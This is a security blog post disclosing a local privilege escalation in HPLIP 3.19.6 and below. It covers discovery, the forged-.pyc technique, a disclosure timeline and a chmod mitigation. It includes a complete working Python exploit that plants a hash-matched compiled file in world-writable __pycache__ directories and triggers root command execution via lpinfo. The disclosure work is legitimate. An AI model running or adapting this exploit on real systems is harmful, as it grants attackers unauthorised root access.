@@ -1,0 +1,279 @@
+<!DOCTYPE HTML>
+<html>
+  <head> <meta charset="utf-8"/>
+<meta name="generator" content="Docutils 0.14: http://docutils.sourceforge.net/" />
+<title>Breakpoint: Privilege escalation in HPLIP</title>
+    <link rel="stylesheet" type="text/css" href="../style/base.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/pygments.css"/>
+
+    <link rel="alternate" type="application/rss+xml" title="Breakpoint RSS" href="../rss.xml"/>
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="site-title">
+        <div class="title-text">
+          <h1>Breakpoint</h1>
+          <h2>Stepping through security</h2>
+        </div>
+        <img src="../image/tomoko1.png"/>
+      </div>
+      <div class="wrap">
+        <ul>
+          <li><a href="../index.html">Index</a></li>
+          <li><a href="https://github.com/cym13">Github</a></li>
+          <li><a href="../about.html">About</a></li>
+        </ul>
+      </div>
+    </header>
+
+    <div class="content">
+      <div class="section" id="privilege-escalation-in-hplip">
+<h1>Privilege escalation in HPLIP</h1>
+<p><strong>tl;dr</strong>: Default installations of HPLIP version 3.19.6 and below are
+vulnerable to a local privilege escalation 0-day that is important but not
+critical due to its setup. It is due to a world-writable directory containing
+compiled python files.</p>
+<div class="section" id="the-end-of-good-old-tmp-symlink-privilege-escalation">
+<h2>The end of good old /tmp symlink privilege escalation</h2>
+<p>I like file-based privilege escalations, so much so that I already did two
+articles around them <a class="reference external" href="/scr_privesc.html">here</a> and <a class="reference external" href="/mail_local_tocttou.html">there
+(FR)</a>. These bugs are always nice: tricky but
+understandable, fun yet exploitable and of course powerful.</p>
+<p>The old and most common idea is to trick a privileged program into reading or
+writing the file of your choice by guiding it through a symlink at just the
+right time. It can happen if using a temporary file in a world-writable
+directory such as /tmp for example since anyone can create a file there with
+the expected name.</p>
+<p>Well, that's the way it used to go at least. But now there's a new sheriff in
+Linux town: <a class="reference external" href="https://sysctl-explorer.net/fs/protected_symlinks/">/proc/sys/fs/protected_symlinks</a>. That bad boy forbids
+any process to follow a symlink placed in a sticky world-writable directory
+such as /tmp unless the owners match. Its deputy,
+<a class="reference external" href="https://sysctl-explorer.net/fs/protected_hardlinks/">/proc/sys/fs/protected_hardlinks</a>, finishes the job by
+forbidding the creation of hard links to files you do not own.</p>
+<p>All joke aside, those are great security features that effectively and
+proactively block many privilege escalation bugs (especially considering the
+number of sysadmin scripts I've seen that run as root while manipulating
+files in /tmp).</p>
+<p>However protected_symlinks only protects sticky directories and only against
+link attacks. World-writable directories are still a weak point where we can
+remove existing files and create our owns.</p>
+</div>
+<div class="section" id="vulnerability-discovery">
+<h2>Vulnerability discovery</h2>
+<p>A few month ago I decided to look for world-writable directories on my system
+to get an idea of my exposure. This is a simple find command from which two
+directories emerged:</p>
+<pre class="code sh literal-block"><code>$ find / -type d -perm -007
+…
+/usr/share/hplip/prnt/__pycache__
+/usr/share/hplip/base/pexpect/__pycache__
+…</code></pre>
+<p>HPLIP (HP Linux Imaging and Printing) is an HP Inc project that proposes
+better integration of HP products on Linux.</p>
+<img alt="../image/gekkan_shoujo_peek.png" src="../image/gekkan_shoujo_peek.png" />
+<p>They contained compiled python files, bytecode files that are produced when
+importing a library and cached for performance. Since they're loaded on
+subsequent access they're effectively executables.</p>
+<pre class="literal-block">/usr/share/hplip/base/pexpect/__pycache__:
+total 128
+-rw-r--r-- 1 root cups 65211 Jul 13  2018 __init__.cpython-36.pyc
+-rw-r--r-- 1 root cups 63065 Jun  4 07:17 __init__.cpython-37.pyc
+
+/usr/share/hplip/prnt/__pycache__:
+total 92
+-rw-r--r-- 1 root cups 22289 Jul 13  2018 cups.cpython-36.pyc
+-rw-r--r-- 1 root cups 22236 Jun  4 07:17 cups.cpython-37.pyc
+-rw-r--r-- 1 root cups   116 Jul 13  2018 __init__.cpython-36.pyc
+-rw-r----- 1 root cups   120 Jun  5 07:27 __init__.cpython-37.pyc
+-rw-r--r-- 1 root cups  8934 Jul 13  2018 ldl.cpython-36.pyc
+-rw-r--r-- 1 root cups 12439 Jun  4 07:17 ldl.cpython-37.pyc
+-rw-r--r-- 1 root cups  1522 Jul 13  2018 pcl.cpython-36.pyc
+-rw-r--r-- 1 root cups  2116 Jun  4 07:17 pcl.cpython-37.pyc</pre>
+<p>Later investigation showed that these files were imported by HPLIP on
+different occasions. It seemed related to listing available printers in CUPS
+notably when adding a new one, but later investigation showed that using
+<em>lpinfo -v</em> removes the need to use the CUPS web interface.</p>
+<p>So we have a bunch of executables owned by root in a directory that any user
+can mess with and that can be triggered by poking the CUPS server, what could
+go wrong?</p>
+</div>
+<div class="section" id="exploitation">
+<h2>Exploitation</h2>
+<p>The basic idea is as follow:</p>
+<ul class="simple">
+<li><p>Write our own compiled python file that runs a command of our choice</p></li>
+<li><p>Replace one of the HPLIP PYC file with our own</p></li>
+<li><p>List printers through lpinfo</p></li>
+<li><p>Drink to our success as our PYC file is executed with root privileges</p></li>
+</ul>
+<p>Easy right? Quite: there are two problems we need to take care of beforehand.
+The first one is that listing printers in CUPS can only be done by someone in
+the <strong>sys</strong> group. From there on we'll assume that our user in in that group.</p>
+<p>We can verify easily that HPLIP files are executed by deleting the content
+of /usr/share/hplip/prnt/__pycache__ (don't worry, it's only cache) and
+executing <em>lpinfo -v</em>. We see that the four files are recreated. Replacing
+any of these file by our own would trigger the issue.</p>
+<p>The other real issue is to write our own PYC file. Of course we could study
+the file format but it's much easier to ask python to compile our source file
+directly. This can be done using the standard library module <strong>py_compile</strong>.</p>
+<pre class="code python literal-block"><code><span class="kn">import</span> <span class="nn">py_compile</span>
+<span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/tmp/test.py&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;print('Hello')&quot;</span><span class="p">)</span>
+<span class="n">py_compile</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&quot;/tmp/test.py&quot;</span><span class="p">)</span>
+<span class="c1"># /tmp/__pycache__/test.cpython-37.pyc</span></code></pre>
+<p>This seems easy enough, but if we try we quickly notice that it doesn't work
+as expected: python completely ignores our PYC file, removes it and writes his
+own. And thinking about it it's normal: this is a cache file, it must have
+some way to check that the original source file wasn't changed. Since our PYC
+doesn't correspond to the original file python assumes that the source file
+has been changed and recompiles it.</p>
+<p>Armed with that idea we start looking for a hash of the source file in the
+compiled one. Sure enough, after some trial and errors, bytes 8 through 16
+correspond to a hash. Which one? I didn't care to find out, I just copied the
+original PYC's hash into my own and it was properly executed when calling
+HPLIP.</p>
+<img alt="../image/gekkan_shoujo_quickvic.png" src="../image/gekkan_shoujo_quickvic.png" style="width: 40%;" />
+</div>
+<div class="section" id="exploit">
+<h2>Exploit</h2>
+<p>Here is the final exploit in all its splendor, tried on a stock Manjaro
+installation which has HPLIP and cups running by default, from a user named
+&quot;test&quot; whose only groups were <em>sys test</em>.</p>
+<img alt="../image/hplip_exploit_proof.png" src="../image/hplip_exploit_proof.png" />
+<pre class="code python literal-block"><code><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">py_compile</span>
+<span class="kn">import</span> <span class="nn">tempfile</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">check_dir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">None</span>
+
+    <span class="n">pycache_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;__pycache__&quot;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">pycache_path</span><span class="p">):</span>
+        <span class="n">trigger_add_printer</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">access</span><span class="p">(</span><span class="n">pycache_path</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">W_OK</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">pycache_path</span>
+    <span class="k">return</span> <span class="bp">None</span>
+
+
+<span class="k">def</span> <span class="nf">pyc_compile_file</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">fo</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
+    <span class="n">py_compile</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">cfile</span><span class="o">=</span><span class="n">fo</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">fo</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">fo</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+
+<span class="k">def</span> <span class="nf">pyc_get_hash</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="c1"># If necessary, add-printer once to pre-load pyc files</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">access</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">R_OK</span><span class="p">):</span>
+        <span class="n">init_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">filename</span><span class="p">)),</span>
+                                 <span class="s2">&quot;__init__.py&quot;</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">pyc_compile_file</span><span class="p">(</span><span class="n">init_path</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">content</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">pyc_content</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">pyc_hash</span><span class="p">):</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="s1">'import os</span><span class="se">\n</span><span class="s1">os.system(&quot;&quot;&quot; </span><span class="si">%s</span><span class="s1"> &quot;&quot;&quot;)'</span> <span class="o">%</span> <span class="n">cmd</span>
+    <span class="n">fi</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">fi</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">))</span>
+    <span class="n">raw</span> <span class="o">=</span> <span class="n">pyc_compile_file</span><span class="p">(</span><span class="n">fi</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">fi</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">raw</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="n">pyc_hash</span> <span class="o">+</span> <span class="n">raw</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Usage: </span><span class="si">%s</span><span class="s2"> CMD&quot;</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">return</span> <span class="mi">1</span>
+
+    <span class="n">cmd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Check that /usr/share/hplip/ contains 777 directories&quot;</span><span class="p">)</span>
+    <span class="n">vulnerable_dir</span> <span class="o">=</span> <span class="p">(</span><span class="n">check_dir</span><span class="p">(</span><span class="s2">&quot;/usr/share/hplip/prnt&quot;</span><span class="p">)</span> <span class="ow">or</span>
+                      <span class="n">check_dir</span><span class="p">(</span><span class="s2">&quot;/usr/share/hplip/base/pexpect&quot;</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="n">vulnerable_dir</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[!] hplip not available or not vulnerable&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">1</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[-] Found: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">vulnerable_dir</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Write and compile an __init__.py file&quot;</span><span class="p">)</span>
+    <span class="n">init_file_name</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">filename</span>
+                            <span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">vulnerable_dir</span><span class="p">)</span>
+                            <span class="k">if</span> <span class="s2">&quot;__init__&quot;</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="n">init_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">vulnerable_dir</span><span class="p">,</span> <span class="n">init_file_name</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Recover the original pyc hash&quot;</span><span class="p">)</span>
+    <span class="n">pyc_hash</span> <span class="o">=</span> <span class="n">pyc_get_hash</span><span class="p">(</span><span class="n">init_file_path</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Write the new pyc file in the vulnerable directory&quot;</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">init_file_path</span><span class="p">)</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">init_file_path</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pyc_content</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">pyc_hash</span><span class="p">))</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Call lpinfo to list printers and trigger command&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;lpinfo&quot;</span><span class="p">,</span> <span class="s2">&quot;-v&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[!] lpinfo failed, are you in the 'sys' group?&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">1</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;[+] Success (probably)!&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre>
+<img alt="../image/gekkan_shoujo_victory.png" src="../image/gekkan_shoujo_victory.png" style="width: 40%;" />
+</div>
+<div class="section" id="impact-and-follow-up">
+<h2>Impact and follow-up</h2>
+<p>Privilege escalations should never be treated lightly but they require to
+already have access to the system. Furthermore access to the <em>sys</em> group
+is seldom given to users that aren't already part of the sudo group. If that
+situation arises though then this exploit is quite effective.</p>
+<p>At the moment Manjaro releases at least are vulnerable out of the box and <strong>no
+patch exists</strong>. I've tried several times to alert the HP team behind HPLIP of
+this issue but received no answer. Following the common 90 days deadline I'm
+releasing this in the wild in hope to alert users and manufacturers alike.</p>
+<p>The only local fix I know is to remove all access to /usr/share/hplip for
+users that aren't in the correct group. It might have unforeseen effects, but
+simply deleting or changing the rights of the <em>__pycache__</em> directories is
+useless: HPLIP automatically changes the rights back to 777.</p>
+<pre class="code bash literal-block"><code>sudo chmod <span class="m">750</span> /usr/share/hplip</code></pre>
+<div class="section" id="timeline">
+<h3>Timeline</h3>
+<ul class="simple">
+<li><p>2019/06/04: Discovery</p></li>
+<li><p>2019/06/06: First mail to HP — No answer</p></li>
+<li><p>2019/08/29: Second mail to HP — No answer</p></li>
+<li><p>2019/09/06: Third mail to HP — No answer</p></li>
+<li><p>2019/12/06: Public disclosure</p></li>
+</ul>
+<img alt="../image/gekkan_shoujo_grumpy.png" src="../image/gekkan_shoujo_grumpy.png" style="width: 40%;" />
+</div>
+<div class="section" id="image-sources">
+<h3>Image sources</h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.nicepng.com/ourpic/u2q8q8t4r5t4y3o0_anime-shit-ura-omote-fortune-gekkan-shojo-nozaki/">https://www.nicepng.com/ourpic/u2q8q8t4r5t4y3o0_anime-shit-ura-omote-fortune-gekkan-shojo-nozaki/</a></p></li>
+<li><p><a class="reference external" href="https://boards.fireden.net/a/last/50/165510639/">https://boards.fireden.net/a/last/50/165510639/</a></p></li>
+<li><p><a class="reference external" href="https://picsart.com/i/sticker-anime-animegirl-gekkan-shoujo-nozaki-kun-nozaki-235098356053212">https://picsart.com/i/sticker-anime-animegirl-gekkan-shoujo-nozaki-kun-nozaki-235098356053212</a></p></li>
+<li><p><a class="reference external" href="https://knowyourmeme.com/photos/830115-gekkan-shoujo-nozaki-kun-monthly-girls-nozaki-kun">https://knowyourmeme.com/photos/830115-gekkan-shoujo-nozaki-kun-monthly-girls-nozaki-kun</a></p></li>
+</ul>
+</div>
+</div>
+</div>
+    </div>
+    <footer "class"="site-footer">
+      <div "class"="publication_date">
+        First published: 
+      </div>
+    </footer>
+  </body>
+</html>
